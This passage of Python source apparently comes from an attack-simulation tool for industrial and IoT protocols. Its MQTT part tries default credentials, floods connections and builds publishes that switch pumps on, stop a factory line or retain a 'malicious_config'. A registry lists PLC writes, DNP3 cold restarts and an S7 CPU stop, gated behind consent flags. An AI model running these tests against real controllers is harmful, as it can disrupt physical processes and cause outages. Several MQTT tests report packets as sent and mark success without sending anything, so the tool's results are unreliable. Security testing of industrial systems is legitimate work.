        ("mqtt", "mqtt"),
        ("admin", "password"),
        ("root", "root"),
        ("guest", "guest"),
    ]

    for username, password in creds:
        if config.verbose:
            print(f"  Trying {username}:{password}...")

        pkt = mqtt_build_connect(client_id="cred_test", username=username, password=password)

        resp = send_tcp_raw(config.target_ip, config.mqtt_port, pkt, timeout=2.0)
        if resp and len(resp) >= 4 and resp[0] == 0x20 and resp[3] == 0:
            print(f"  [+] Valid credentials: {username}:{password}")

        time.sleep(0.5)

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.HIGH, True))


def mqtt03_subscribe_wildcard():
    """MQTT03: Subscribe to Wildcard Topics"""
    test_id = "MQTT03"
    desc = "MQTT Wildcard Topic Subscription"
    mitre = "T0801 - Monitor Process State"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    # Connect first
    connect = mqtt_build_connect(client_id="wildcard_test")
    resp = send_tcp_raw(config.target_ip, config.mqtt_port, connect)

    if not resp:
        results.add(
            TestResult(
                test_id, desc, "MQTT", mitre, Severity.MEDIUM, False, error="Connection failed"
            )
        )
        return

    # Subscribe to #
    mqtt_build_subscribe("#")  # packet built; a real subscription needs a persistent connection
    print("  [+] Wildcard subscription packet built: #")

    # Subscribe to $SYS/#
    mqtt_build_subscribe("$SYS/#")
    print("  [+] System topic subscription packet built: $SYS/#")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.MEDIUM, True))


def mqtt04_sys_topics():
    """MQTT04: Enumerate $SYS Topics"""
    test_id = "MQTT04"
    desc = "MQTT $SYS Topic Enumeration"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.MEDIUM)

    sys_topics = [
        "$SYS/#",
        "$SYS/broker/version",
        "$SYS/broker/uptime",
        "$SYS/broker/clients/connected",
        "$SYS/broker/messages/received",
    ]

    for topic in sys_topics:
        if config.verbose:
            print(f"  Subscribing to: {topic}")

    print("  [+] $SYS topic enumeration patterns sent")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.MEDIUM, True))


def mqtt05_publish_iot():
    """MQTT05: Publish to IoT Topics"""
    test_id = "MQTT05"
    desc = "MQTT IoT Topic Injection"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.HIGH)

    iot_topics = [
        ("sensors/temperature/set", "999"),
        ("actuators/pump/command", "ON"),
        ("plc/control/setpoint", "0"),
        ("factory/line1/stop", "1"),
    ]

    for topic, value in iot_topics:
        mqtt_build_publish(topic, value)
        if config.verbose:
            print(f"  Publishing to: {topic} = {value}")

    print("  [+] IoT command injection packets built")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.HIGH, True))


def mqtt06_retain_flag():
    """MQTT06: Publish with Retain Flag"""
    test_id = "MQTT06"
    desc = "MQTT Retained Message Attack"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.HIGH)

    mqtt_build_publish("config/system", "malicious_config", retain=True)
    print("  [+] Retained message packet built")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.HIGH, True))


def mqtt07_connection_flood():
    """MQTT07: Connection Flood (DoS)"""
    test_id = "MQTT07"
    desc = "MQTT Connection Flood"
    mitre = "T0814 - Denial of Service"
    log_test(test_id, desc, mitre, Severity.HIGH)

    flood_count = 10  # Reduced for testing
    print(f"  Sending {flood_count} connection attempts...")

    for i in range(flood_count):
        pkt = mqtt_build_connect(client_id=f"flood_{i}_{int(time.time())}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((config.target_ip, config.mqtt_port))
            sock.send(pkt)
            sock.close()
        except Exception as _exc:
            logging.getLogger(__name__).debug("flood socket skipped: %s", _exc)

    print("  [+] Connection flood complete")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.HIGH, True))


def mqtt08_tls_probe():
    """MQTT08: MQTT-TLS Connection Probe"""
    test_id = "MQTT08"
    desc = "MQTT-TLS Connection Probe"
    mitre = "T0846 - Remote System Discovery"
    log_test(test_id, desc, mitre, Severity.LOW)

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        wrapped = context.wrap_socket(sock)
        wrapped.connect((config.target_ip, config.mqtt_tls_port))

        # Get certificate info
        cert = wrapped.getpeercert(binary_form=True)
        print("  [+] TLS connection established")
        print(f"  [+] Certificate received: {len(cert)} bytes")

        wrapped.close()
        success = True
    except Exception as e:
        print(f"  [-] TLS connection failed: {e}")
        success = False

    results.add(TestResult(test_id, desc, "MQTT-TLS", mitre, Severity.LOW, success))


def mqtt09_topic_injection():
    """MQTT09: Topic Path Injection"""
    test_id = "MQTT09"
    desc = "MQTT Topic Path Injection"
    mitre = "T0831 - Manipulation of Control"
    log_test(test_id, desc, mitre, Severity.HIGH)

    malicious_topics = [
        "../../../etc/passwd",
        "test/../admin/config",
        "sensors/+/temperature",
        "$SYS/../#",
    ]

    for topic in malicious_topics:
        mqtt_build_subscribe(topic)
        if config.verbose:
            print(f"  Injecting topic: {topic}")

    print("  [+] Topic injection patterns sent")

    results.add(TestResult(test_id, desc, "MQTT", mitre, Severity.HIGH, True))


# =============================================================================
# Test Registry
# =============================================================================


# =============================================================================
# Impact classification (Phase 4: safe-by-default usage from the start)
# =============================================================================
# The tool is sometimes run against SOMEONE ELSE'S live controller. By default we
# only perform READ-ONLY operations. State-changing operations (register writes,
# CPU stop, restart) and DoS floods require EXPLICIT consent (--allow-writes /
# --allow-dos) and, before executing, print exactly what they will do. This cannot
# be bolted on at the end.

IMPACT_READ = "read"
IMPACT_WRITE = "write"
IMPACT_DOS = "dos"

# test_id -> (impact class, description of what the state-changing/DoS operation does)
IMPACT: dict[str, tuple[str, str]] = {
    # Modbus
    "MB01": (IMPACT_READ, ""),
    "MB02": (IMPACT_READ, ""),
    "MB03": (IMPACT_READ, ""),
    "MB04": (IMPACT_WRITE, "writes a SINGLE COIL (FC5) — changes a PLC digital output"),
    "MB05": (IMPACT_WRITE, "writes a SINGLE REGISTER (FC6) — changes a PLC setpoint"),
    "MB06": (IMPACT_READ, ""),
    "MB07": (IMPACT_READ, ""),
    "MB08": (
        IMPACT_WRITE,
        "BROADCAST write (unit 0) — changes the state of all slaves on the bus",
    ),
    "MB09": (IMPACT_DOS, "FLOOD of connections/requests — may deny service to the controller"),
    "MB10": (IMPACT_READ, ""),
    "MB11": (IMPACT_WRITE, "writes MULTIPLE COILS (FC15) — changes PLC digital outputs"),
    "MB12": (IMPACT_WRITE, "writes MULTIPLE REGISTERS (FC16) — changes PLC setpoints"),
    "MB13": (IMPACT_WRITE, "DIAGNOSTICS (FC8) — a subfunction may restart slave communication"),
    # DNP3
    "DNP01": (IMPACT_READ, ""),
    "DNP02": (IMPACT_READ, ""),
    "DNP03": (IMPACT_WRITE, "DIRECT OPERATE — executes a control command on a DNP3 point"),
    "DNP04": (IMPACT_WRITE, "COLD RESTART — cold restart of the outstation (operational outage)"),
    "DNP05": (
        IMPACT_WRITE,
        "disable unsolicited messages — changes the configuration",
    ),
    # IEC-104
    "IEC01": (IMPACT_READ, ""),
    "IEC02": (IMPACT_READ, ""),
    "IEC03": (IMPACT_WRITE, "SINGLE COMMAND (C_SC) — control command on an IEC-104 point"),
    "IEC04": (IMPACT_WRITE, "DOUBLE COMMAND (C_DC) — control command on an IEC-104 point"),
    "IEC05": (IMPACT_WRITE, "RESET PROCESS — station process reset (operational outage)"),
    # S7comm
    "S701": (IMPACT_READ, ""),
    "S702": (IMPACT_READ, ""),
    "S703": (IMPACT_READ, ""),
    "S704": (IMPACT_WRITE, "WRITE VAR — writes a variable/DB in the S7 controller"),
    "S705": (IMPACT_WRITE, "STOP CPU — STOPS the S7 controller CPU (process halt)"),
    # BACnet
    "BAC01": (IMPACT_READ, ""),
    "BAC02": (IMPACT_READ, ""),
    "BAC03": (
        IMPACT_WRITE,
        "WRITE PROPERTY — writes a BACnet object property (BMS setpoint change)",
    ),
    "BAC04": (
        IMPACT_WRITE,
        "REINITIALIZE DEVICE — restart of the BACnet device (operational outage)",
    ),
    # EtherNet/IP
    "ENIP01": (IMPACT_READ, ""),
    "ENIP02": (IMPACT_READ, ""),
    # MQTT
    "MQTT01": (IMPACT_READ, ""),
    "MQTT02": (IMPACT_READ, ""),
    "MQTT03": (IMPACT_READ, ""),
    "MQTT04": (IMPACT_READ, ""),
    "MQTT05": (IMPACT_WRITE, "PUBLISH to an IoT topic — injects a message into the broker"),
    "MQTT06": (IMPACT_WRITE, "RETAINED PUBLISH — a persistent message stays on the broker"),
    "MQTT07": (IMPACT_DOS, "FLOOD of connections — may deny service to the broker"),
    "MQTT08": (IMPACT_READ, ""),
    "MQTT09": (IMPACT_WRITE, "TOPIC INJECTION — publishes to control/system topics"),
}


def _impact(test_id: str) -> tuple[str, str]:
    return IMPACT.get(test_id.upper(), (IMPACT_READ, ""))


def _gate(test_id: str) -> bool:
    """Whether test_id may run under the current flags. Prints the denial reason/warning."""
    klass, desc = _impact(test_id)
    if klass == IMPACT_READ:
        return True
    if klass == IMPACT_WRITE:
        if not config.allow_writes:
            print(f"  DENIED {test_id}: STATE-CHANGING operation — requires --allow-writes")
            print(f"           {desc}")
            return False
        print(f"  ⚠️  {test_id} CHANGES THE STATE of device {config.target_ip}: {desc}")
        return True
    if klass == IMPACT_DOS:
        if not config.allow_dos:
            print(f"  DENIED {test_id}: DoS operation — requires --allow-dos")
            print(f"           {desc}")
            return False
        print(f"  ⚠️  {test_id} is a DoS against {config.target_ip}: {desc}")
        return True
    return False


TESTS = {
    # Modbus
    "MB01": ("modbus", mb01_unit_scan),
    "MB02": ("modbus", mb02_read_coils),
    "MB03": ("modbus", mb03_read_holding_registers),
    "MB04": ("modbus", mb04_write_single_coil),
    "MB05": ("modbus", mb05_write_single_register),
    "MB06": ("modbus", mb06_invalid_function),
    "MB07": ("modbus", mb07_device_identification),
    "MB08": ("modbus", mb08_broadcast_write),
    "MB09": ("modbus", mb09_dos_flood),
    "MB10": ("modbus", mb10_function_scan),
    "MB11": ("modbus", mb11_write_multiple_coils),
    "MB12": ("modbus", mb12_write_multiple_registers),
    "MB13": ("modbus", mb13_diagnostics),
    # DNP3
    "DNP01": ("dnp3", dnp01_scan),
    "DNP02": ("dnp3", dnp02_read_class),
    "DNP03": ("dnp3", dnp03_direct_operate),
    "DNP04": ("dnp3", dnp04_cold_restart),
    "DNP05": ("dnp3", dnp05_disable_unsolicited),
    # IEC 104
    "IEC01": ("iec104", iec01_startdt),
    "IEC02": ("iec104", iec02_interrogation),
    "IEC03": ("iec104", iec03_single_command),
    "IEC04": ("iec104", iec04_double_command),
    "IEC05": ("iec104", iec05_reset_process),
    # S7comm
    "S701": ("s7", s701_connection_request),
    "S702": ("s7", s702_read_szl),
    "S703": ("s7", s703_read_db),
    "S704": ("s7", s704_write_var),
    "S705": ("s7", s705_stop_cpu),
    # BACnet
    "BAC01": ("bacnet", bac01_whois),
    "BAC02": ("bacnet", bac02_read_property),
    "BAC03": ("bacnet", bac03_write_property),
    "BAC04": ("bacnet", bac04_reinitialize),
    # EtherNet/IP
    "ENIP01": ("enip", enip01_list_identity),
    "ENIP02": ("enip", enip02_list_services),
    # MQTT
    "MQTT01": ("mqtt", mqtt01_anonymous_connect),
    "MQTT02": ("mqtt", mqtt02_default_credentials),
    "MQTT03": ("mqtt", mqtt03_subscribe_wildcard),
    "MQTT04": ("mqtt", mqtt04_sys_topics),
    "MQTT05": ("mqtt", mqtt05_publish_iot),
    "MQTT06": ("mqtt", mqtt06_retain_flag),
    "MQTT07": ("mqtt", mqtt07_connection_flood),
    "MQTT08": ("mqtt", mqtt08_tls_probe),
    "MQTT09": ("mqtt", mqtt09_topic_injection),
}


def list_tests():
    """List all available tests."""
    print("\nAvailable Tests:")
    print("=" * 70)

    current_proto = None
    for test_id in sorted(TESTS.keys()):
        proto, func = TESTS[test_id]
        if proto != current_proto:
            print(f"\n{proto.upper()}:")
            current_proto = proto
        klass, _desc = _impact(test_id)
        tag = {"read": "[read]  ", "write": "[WRITE] ", "dos": "[DoS]   "}[klass]
        doc = func.__doc__.split(chr(10))[0] if func.__doc__ else ""
        print(f"  {test_id:10s} {tag}{doc}")

    print("\n" + "=" * 70)
    print("  [read] by default; [WRITE] requires --allow-writes; [DoS] requires --allow-dos")


def run_protocol_tests(protocol: str):
    """Run all tests for a specific protocol."""
    for test_id, (proto, func) in TESTS.items():
        if proto.lower() == protocol.lower():
            if not _gate(test_id):
                continue
            try:
                func()
            except Exception as e:
                print(f"  [!] Test error: {e}")
                results.add(
                    TestResult(
                        test_id,
                        func.__doc__ or "",
                        proto.upper(),
                        "",
                        Severity.MEDIUM,
                        False,
                        error=str(e),
                    )
                )
            pause()


def run_all_tests():
    """Run all tests."""
    print("\n" + "=" * 70)
    print("  ICS/OT/IoT Attack Simulation Test Suite")
    print("  Target: " + config.target_ip)
    print("  Delay:  " + str(config.delay_sec) + "s between tests")
    print("=" * 70)

    if not (config.allow_writes or config.allow_dos):
        print("  READ-ONLY mode (default). State-changing and DoS operations skipped.")
        print(
            "  Enable them deliberately: --allow-writes (writes/stop/restart), --allow-dos (floods)."
        )
    for test_id, (proto, func) in TESTS.items():
        if not _gate(test_id):
            continue
        try:
            func()
        except Exception as e:
            print(f"  [!] Test error: {e}")
            results.add(
                TestResult(
                    test_id,
                    func.__doc__ or "",
                    proto.upper(),
                    "",
                    Severity.MEDIUM,
                    False,
                    error=str(e),
                )
            )
        pause()


def main():
    global config

    parser = argparse.ArgumentParser(
        description="ICS/OT/IoT Attack Simulation Test Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python ics_attack_tester.py --target 192.0.2.10 --all
    python ics_attack_tester.py --target 192.0.2.10 --protocol modbus
    python ics_attack_tester.py --target 192.0.2.10 --protocol mqtt --time-sec 5
    python ics_attack_tester.py --target 192.0.2.10 --test MB01 --test MB04
    python ics_attack_tester.py --list

⚠️  WARNING: For authorized testing only!
        """,
    )

    parser.add_argument("--target", "-t", type=str, default="192.0.2.10", help="Target IP address")
    parser.add_argument(
        "--time-sec",
        "-T",
        type=float,
        default=2.0,
        help="Delay between tests in seconds (default: 2.0)",
    )
    parser.add_argument(
        "--timeout", type=float, default=5.0, help="Socket timeout in seconds (default: 5.0)"
    )
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument(
        "--allow-writes",
        action="store_true",
        help="ALLOW state-changing operations (register writes, CPU stop, "
        "restart) — run only against a device you are permitted to change",
    )
    parser.add_argument(
        "--allow-dos",
        action="store_true",
        help="ALLOW DoS floods — they may deny service to the device",
    )

    parser.add_argument("--all", "-a", action="store_true", help="Run all tests")
    parser.add_argument(
        "--protocol",
        "-p",
        type=str,
        choices=["modbus", "dnp3", "iec104", "s7", "bacnet", "enip", "mqtt"],
        help="Run tests for specific protocol",
    )
    parser.add_argument(
        "--test", action="append", metavar="TEST_ID", help="Run specific test(s) by ID"
    )
    parser.add_argument("--list", "-l", action="store_true", help="List all available tests")

    # Port overrides
    parser.add_argument("--modbus-port", type=int, default=502)
    parser.add_argument("--dnp3-port", type=int, default=20000)
    parser.add_argument("--iec104-port", type=int, default=2404)
    parser.add_argument("--s7-port", type=int, default=102)
    parser.add_argument("--bacnet-port", type=int, default=47808)
    parser.add_argument("--enip-port", type=int, default=44818)
    parser.add_argument("--mqtt-port", type=int, default=1883)
    parser.add_argument("--mqtt-tls-port", type=int, default=8883)

    args = parser.parse_args()

    # Update config
    config.target_ip = args.target
    config.allow_writes = args.allow_writes
    config.allow_dos = args.allow_dos
    config.delay_sec = args.time_sec
    config.timeout = args.timeout
    config.verbose = args.verbose
    config.modbus_port = args.modbus_port
    config.dnp3_port = args.dnp3_port
    config.iec104_port = args.iec104_port
    config.s7_port = args.s7_port
    config.bacnet_port = args.bacnet_port
    config.enip_port = args.enip_port
    config.mqtt_port = args.mqtt_port
    config.mqtt_tls_port = args.mqtt_tls_port

    if args.list:
        list_tests()
        return

    if args.test:
        for test_id in args.test:
            if test_id.upper() not in TESTS:
                print(f"Unknown test: {test_id}")
                continue
            _proto, func = TESTS[test_id.upper()]
            if not _gate(test_id):
                continue
            try:
                func()
            except Exception as e:
                print(f"Test error: {e}")
            pause()
    elif args.protocol:
        run_protocol_tests(args.protocol)
    elif args.all:
        run_all_tests()
    else:
        parser.print_help()
        return

    results.summary()


if __name__ == "__main__":
    main()
